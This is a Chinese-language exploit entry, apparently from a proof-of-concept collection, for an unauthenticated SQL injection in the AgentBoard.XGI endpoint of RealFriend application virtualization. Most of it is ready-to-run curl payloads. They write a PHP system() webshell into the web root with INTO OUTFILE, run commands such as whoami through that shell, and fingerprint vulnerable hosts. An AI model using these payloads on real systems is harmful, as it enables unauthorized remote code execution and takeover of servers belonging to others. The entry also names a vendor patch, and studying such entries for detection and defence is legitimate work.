---
id: REALFRIEND-AGENTBOARD-RCE
title: 瑞友天翼应用虚拟化系统 AgentBoard.XGI SQL注入写 Webshell RCE
product: realfriend
vendor: 瑞友天翼
version_affected: "5.x - 7.0.3.1"
severity: CRITICAL
tags: [rce, sqli, file_upload, 无需认证, 国产]
fingerprint: ["瑞友天翼", "RealFriend", "AgentBoard", "Rap Server"]
---

## 漏洞描述

瑞友天翼应用虚拟化系统的 `AgentBoard.XGI` 接口存在 SQL 注入漏洞。攻击者可利用 UNION SELECT INTO OUTFILE 将 PHP webshell 写入 Web 目录，从而实现未授权的远程代码执行。

## 影响版本

- 瑞友天翼应用虚拟化系统 5.x - 7.0.3.1

## 前置条件

- 无需认证
- Web 端口可访问
- MySQL 有写文件权限

## 利用步骤

1. 通过 AgentBoard.XGI 的 user 参数进行 SQL 注入
2. 利用 UNION SELECT INTO OUTFILE 写入 PHP webshell
3. 访问写入的 webshell 执行命令

## Payload

### 写入 webshell

```bash
curl -s "http://target/AgentBoard.XGI?user=-1'+union+select+1,'<%3Fphp+system(\$_GET[\"cmd\"])%3B%3F>'+into+outfile+'C:\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\cmd.php'+--+-&cmd=UserLogin"
```

### 执行命令

```bash
curl -s "http://target/cmd.php?cmd=whoami"
curl -s "http://target/cmd.php?cmd=ipconfig"
```

### 写入 phpinfo 验证

```bash
curl -s "http://target/AgentBoard.XGI?user=-1'+union+select+1,'<%3Fphp+phpinfo()%3B%3F>'+into+outfile+'C:\\Program+Files+(x86)\\RealFriend\\Rap+Server\\WebRoot\\info.php'+--+-&cmd=UserLogin"

# 验证
curl -s "http://target/info.php" | grep "phpinfo"
```

## 验证方法

```bash
# 写入 webshell 后访问验证
curl -s "http://target/cmd.php?cmd=whoami"
# 返回当前用户名即漏洞存在
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "瑞友天翼\|RealFriend\|Rap Server"
curl -s "http://target/AgentBoard.XGI" -o /dev/null -w "%{http_code}"
```

## 参考链接

- http://soft.realor.cn:88/Gwt7.0.4.1.exe (官方修复补丁)
